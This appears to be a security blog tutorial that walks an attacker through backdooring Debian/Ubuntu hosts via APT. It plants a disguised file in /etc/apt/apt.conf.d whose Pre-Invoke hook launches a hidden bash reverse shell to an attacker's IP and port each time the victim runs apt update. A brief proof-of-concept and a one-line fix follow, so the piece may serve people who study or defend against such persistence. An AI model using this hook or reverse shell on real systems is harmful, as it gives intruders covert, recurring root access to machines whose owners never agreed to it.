        <div class="content"><p>In today&rsquo;s article we&rsquo;ll talk about how to create a persistence from the APT package manager.</p>
<h1 id="what-is-apt">What is APT?</h1>
<p>Advanced Package Tool (APT) is a command-line tool found in Debian/Ubuntu-based distributions, responsible for updating, installing, removing and managing packages.</p>
<h1 id="how-does-it-work">How does it work?</h1>
<p>Understanding the purpose of APT, there are several commands that a user can use, one of which is the <strong>update</strong> function, with the purpose of downloading updates and package information from all configured sources (repositories). Below is the command to run update:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash">sudo apt update
</code></pre></div><p>In case you didn&rsquo;t notice in the previous command, APT is always used with <strong>Root</strong> permission, guaranteeing a shell with administrative permission.</p>
<h1 id="configuring-persistence">Configuring Persistence</h1>
<p>When you gain access to the victim&rsquo;s machine, you must already have administrative permission, because only root users have permission to configure the APT directory, located at:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/etc/apt/apt.conf.d
</code></pre></div><p>In this directory, create a file that looks legitimate, for example:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">touch 28update-dist
</code></pre></div><p>With the file created, use a text editor you like and enter the following malicious command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">APT::Update::Pre-invoke <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#39; 2&gt; /dev/null &amp;&#34;</span><span style="color:#f92672">}</span>;
</code></pre></div><p>A brief explanation of the previous command, the first part is responsible for telling APT to invoke an action at update time, our reverse shell in this case. Next we have a classic reverse shell, then we redirect error messages to <strong>/dev/null</strong> and then we leave all this running in the background.</p>
<p>The following images show the file created on the victim&rsquo;s server and its contents:</p>

<h1 id="proof-of-concept">Proof of Concept</h1>
<p>To carry out the proof of concept, two machines were used, a Kali Linux (Attacker) and an Ubuntu Server (Victim).</p>
<p>At first, the attacker must leave a port open waiting for the connection to be received. While on the victim&rsquo;s side, it is necessary to wait for them to update their packages with <strong>update</strong>, the moment they do so we can see that we have received a connection with an administrative shell. The following image illustrates this:</p>

<h1 id="how-to-fix">How to fix</h1>
<p>If you have found a suspicious package, the mitigation is simple! Just delete the package responsible for doing so.</p>
<h1 id="conclusion">Conclusion</h1>
<p>In this article we can understand how an attacker can exploit APT to achieve persistence on Debian/Ubuntu systems, a technique that depends on the interaction of the legitimate user.</p>
